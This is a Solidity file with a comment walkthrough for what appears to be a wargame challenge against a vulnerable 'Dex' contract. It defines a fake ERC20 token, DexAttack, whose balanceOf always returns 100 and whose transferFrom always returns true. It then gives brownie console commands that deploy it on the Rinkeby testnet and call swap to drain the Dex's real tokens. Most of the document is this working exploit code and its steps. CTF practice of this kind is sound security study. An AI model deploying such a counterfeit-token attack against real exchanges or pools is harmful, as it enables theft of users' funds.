/*

in this challenge we'll create a fake ERC20 token that reply with 100 for any balanceOf function call , this will ensure that in get_swap_price ,

a devide by 100 , then we set the amount to 100 in the swap function to get all 100 tokens

=> 100 * 100 / 100 = 100 (get_swap_price)

Note: the contract doesn't check the balance after a transfer 

# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# deploy DexAttack

dexattack = DexAttack.deploy({'from':a[0]})

# call swap => from=dex attack address,  to=the address token1 or token2(at storage 0 or 1) and 100 as the amount

dex  = interface.Dex("DexContractAddress")

dex.swap(dexattack.address,token1,100,{'from': a[0]})

*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.6;


interface Dex {

    function swap(address from, address to, uint amount) external;



}

contract DexAttack {
    
    function balanceOf(address _address) public pure returns (uint) {

        return 100;   
    }
    
  function transferFrom(address _from,address _to,uint amount) public pure returns (bool){
      
      return true;
  }

    function approve() public view {
        this;
    } 
}

